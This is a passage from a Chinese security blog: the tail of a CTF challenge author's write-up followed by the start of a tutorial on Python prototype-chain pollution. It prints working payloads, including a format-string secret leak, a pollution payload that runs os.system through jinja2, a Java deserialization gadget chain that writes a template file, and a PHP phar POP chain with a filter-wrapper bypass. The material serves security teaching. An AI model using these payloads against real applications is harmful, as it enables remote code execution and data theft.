class="string">&quot;age&quot;</span>]</span><br><span class="line">            <span class="keyword">if</span> age != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                instance.age = age</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_change:</span><br><span class="line">            info = <span class="string">&quot; *修改&#123;0&#125;成功（&quot;</span> + <span class="string">&quot;姓名：&quot;</span> + instance.name + <span class="string">&quot;; 年龄：&quot;</span> + instance.age + <span class="string">&quot;岁）&quot;</span></span><br><span class="line">            instance.info = info.<span class="built_in">format</span>(instance)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=instance)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>

<p>通过上面的源码可以发现，update函数存在原型链污染问题，但是需要我们 role 为 admin，而 koishi_secret 文件中的 secret 无法直接获取。但是在渲染前可以发现format内容可控，存在格式化字符串问题，可以通过此处获取全局变量进而获取 secret 内容。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;0.__class__.__init__.__globals__&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207232751157.png"
                      alt="image-20240207232751157"
                ></p>
<p>拿到密钥后即可伪造任意用户，再传入原型链内容即可。</p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p><strong>POST</strong></p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line">Cookie<span class="punctuation">:</span> session=eyJyb2xlIjoiYWRtaW4ifQ.Zbcjzg.Fq7AIofnOt_VHZnZWB6IrV7oNBs</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;/readflag &gt;./static/1.txt&#x27;);#&quot;</span><span class="punctuation">]</span></span><br><span class="line">                  <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>然后直接访问 &#x2F;static&#x2F;1.txt 路由即可获取flag。</p>
<h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><blockquote>
<p>难度：中等偏易</p>
<p>考点：软链接，java反序列化</p>
</blockquote>
<p>题目附件给出了jar文件，反编译后查看源码，发现存在两个路由 &#x2F;upload 和 &#x2F;auth&#x2F;backdoor，而 &#x2F;upload 主要将上传的文件进行了解压操作， &#x2F;auth&#x2F;backdoor 则是常见的反序列化操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207234133284.png"
                      alt="image-20240207234133284"
                ></p>
<p>除此以外，还存在一个拦截器，每次访问 &#x2F;auth&#x2F;** 路由时，会读取 &#x2F;app&#x2F;security.txt 文件进行校验。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207234456175.png"
                      alt="image-20240207234456175"
                ></p>
<p>因此我们要反序列化，首先要去通过解压处使用软链接读密钥文件内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207234854801.png"
                      alt="image-20240207234854801"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HaHaHaThisisMySecretFile</span><br></pre></td></tr></table></figure></div>

<p>有这个key之后，我们就可以进行反序列化了。</p>
<p>反序列化黑名单如下，我们基本上限制死了直接执行命令的方式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207235011414.png"
                      alt="image-20240207235011414"
                ></p>
<p>查看依赖中有 freemaker 和 aspectjweaver，所以我们可以修改首页内容进行模板注入。</p>
<p>随后打一个反序列化即可写文件，再访问首页即可</p>
<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;);</span><br><span class="line">      Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class,int.class);</span><br><span class="line">      declaredConstructor.setAccessible(true);</span><br><span class="line">      HashMap map = (HashMap)declaredConstructor.newInstance(&quot;/app/templates/&quot;, 114514);</span><br><span class="line">      ConstantTransformer constantTransformer = new ConstantTransformer(&quot;koishi_test!!!&quot;.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">      Map outerMap = LazyMap.decorate(map,constantTransformer);</span><br><span class="line">      TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,&quot;index.ftl&quot;);</span><br><span class="line">      HashSet hashSet = new LinkedHashSet(1);</span><br><span class="line">      hashSet.add(tiedMapEntry);</span><br><span class="line">      outerMap.remove(&quot;index.ftl&quot;);</span><br><span class="line">      byte[] bytes = SerializerUtil.objectByteSerialize(hashSet);</span><br><span class="line">      System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(bytes)));</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240208000350430.png"
                      alt="image-20240208000350430"
                ></p>
<h2 id="FileCheck"><a href="#FileCheck" class="headerlink" title="FileCheck"></a>FileCheck</h2><blockquote>
<p>难度：中等</p>
<p>考点：phar 反序列化，黑、白名单绕过，PHP 源码泄露漏洞</p>
</blockquote>
<p>进入首页，发现没有任何突破口，抓包发现服务版本为 <code>X-Powered-By: PHP/7.4.21</code> 可以去读取源码</p>
<p>首先抓校验文件的请求，读取list.php</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240208001024984.png"
                      alt="image-20240208001024984"
                ></p>
<p>发现其中包含了 class.php</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Neepu</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ne</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nee</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;n-&gt;n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ne-&gt;<span class="title function_ invoke__">ne</span>(<span class="variable">$this</span>-&gt;nee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;n = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Koishi</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ii</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ss</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;kk !== <span class="variable language_">$this</span>-&gt;ii) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;kk) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ii)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;kk)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;ii)) )&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ss-&gt;ss = <span class="string">&quot;happy newYear&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m Ko1sh1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shruti</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;r-&gt;u)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ok, empty&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nothing todo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m Shruti&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewYear</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nYear</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;$/&quot;</span>, <span class="variable">$this</span>-&gt;nYear)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arguments</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$arguments</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/s|o|l|e/m&quot;</span>, <span class="variable">$value</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no, bro!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/s|o|l|e/m&quot;</span>, <span class="variable">$arguments</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no, bro!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;距离新年还有：&quot;</span> . <span class="title function_ invoke__">ceil</span>((<span class="title function_ invoke__">strtotime</span>(<span class="string">&quot;2024-02-10&quot;</span>) - <span class="title function_ invoke__">strtotime</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>))) / <span class="number">86400</span>) . <span class="string">&quot; 天&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Obsolescent</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">noWay</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;o-&gt;o) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;o = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>发现起可以执行&#x2F;readflag去读取flag，可以构造pop链。</p>
<p>但此时不存在反序列化的地方，注意到 list.php  调用了 <code>mime_content_type</code> 函数，所以我们可以尝试phar反序列化。</p>
<p>此外还需要注意一个地方，上传之后的文件校验了是否为图片文件，而且在写入的时候添加了部分内容：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//    ini_set(&#x27;open_basedir&#x27;, &#x27;./uploads/&#x27;);</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">       <span class="variable">$fileTmpName</span> = <span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">       <span class="variable">$fileError</span> = <span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>];</span><br><span class="line">       <span class="comment">// 获取文件相关信息</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;No file selected&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>) &amp;&amp; <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$fileTmpName</span>)) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$fileError</span> === <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileTmpName</span>);</span><br><span class="line">               <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/temp.log&quot;</span>, <span class="string">&quot;koishi like this:&quot;</span> . <span class="variable">$fileContent</span>);</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: sandybrown&#x27;&gt;koishi like this!!!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;badbad, koishi hate!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;badbad, koishi hate!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>所以我们需要进行简单的绕过，最终构造的pop链如下：</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Neepu</span> = <span class="keyword">new</span> <span class="title class_">Neepu</span>();</span><br><span class="line"><span class="variable">$Shruti</span> = <span class="keyword">new</span> <span class="title class_">Shruti</span>();</span><br><span class="line"><span class="variable">$NewYear</span> = <span class="keyword">new</span> <span class="title class_">NewYear</span>();</span><br><span class="line"><span class="variable">$Koishi</span> = <span class="keyword">new</span> <span class="title class_">Koishi</span>();</span><br><span class="line"><span class="variable">$Obsolescent</span> = <span class="keyword">new</span> <span class="title class_">Obsolescent</span>();</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;n = <span class="variable">$Shruti</span>;</span><br><span class="line"><span class="variable">$Shruti</span>-&gt;r = <span class="variable">$NewYear</span>;</span><br><span class="line"><span class="variable">$NewYear</span>-&gt;nYear = <span class="variable">$Koishi</span>;</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;kk = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;ii = <span class="keyword">array</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;ss = <span class="variable">$Obsolescent</span>;</span><br><span class="line"><span class="variable">$Obsolescent</span>-&gt;o = <span class="variable">$Neepu</span>;</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;ne = <span class="variable">$NewYear</span>;</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;nee = <span class="string">&quot;ObSOLEScEnt::nOWay&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;success.phar&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) ? <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>) : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;koishi like this:GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$Neepu</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;koishi.txt&quot;</span>,<span class="string">&quot;hello shruti&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>),<span class="title function_ invoke__">strlen</span>(<span class="string">&quot;koishi like this:&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$filename</span>&quot;</span>,<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure></div>



<p>检查文件类型时需要包含 Ko1sh1 内容，由于filter对于过滤器的处理不严格，当过滤器存在异常内容时只会出现 Warming 提示，而不会终止程序，而mime_content_type也支持伪协议，所以最终我们使用的payload如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/Ko1sh1/resource=phar:///tmp/temp.log/koishi.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240208002213628.png"
                      alt="image-20240208002213628"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>联赛</category>
      </categories>
      <tags>
        <tag>出题</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 原型链污染</title>
    <url>/2023/12/25/blog_python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<p>就像<code>Javascript</code>中的原型链污染一样，这种攻击方式可以在<code>Python</code>中实现对类属性值的污染。需要注意的是，由于<code>Python</code>中的安全设定和部分特殊属性类型限定，并不是所有的类其所有的属性都是可以被污染的，不过可以肯定的，污染只对类的属性起作用，对于类方法是无效的。</p>
<p>不过由于<code>Python</code>中变量空间的设置，实际上还能做到对全局变量中的属性实现污染。</p>
<h2 id="合并函数"><a href="#合并函数" class="headerlink" title="合并函数"></a>合并函数</h2><p>就像<code>Javascript</code>的原型链污染一样，同样需要一个数值合并函数将特定值污染到类的属性当中，一个标准示例如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure></div>



<h2 id="污染尝试"><a href="#污染尝试" class="headerlink" title="污染尝试"></a>污染尝试</h2><p>由于<code>Python</code>中的类会继承父类中的属性，而类中声明（并不是实例中声明）的属性是唯一的，所以我们的目标就是这些在多个类、示例中仍然指向唯一的属性，如类中自定义属性及以<code>__</code>开头的内置属性等</p>
<p>先以自定义属性为例子：</p>
<h3 id="修改自定义属性"><a href="#修改自定义属性" class="headerlink" title="修改自定义属性"></a>修改自定义属性</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;koishi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment"># shruti</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment"># shruti</span></span><br></pre></td></tr></table></figure></div>

<p>这里通过实例的 <code>.__class__.__base__</code>  修改了 secret 的值。</p>
<p><strong>修改内置属性也是类似：</strong></p>
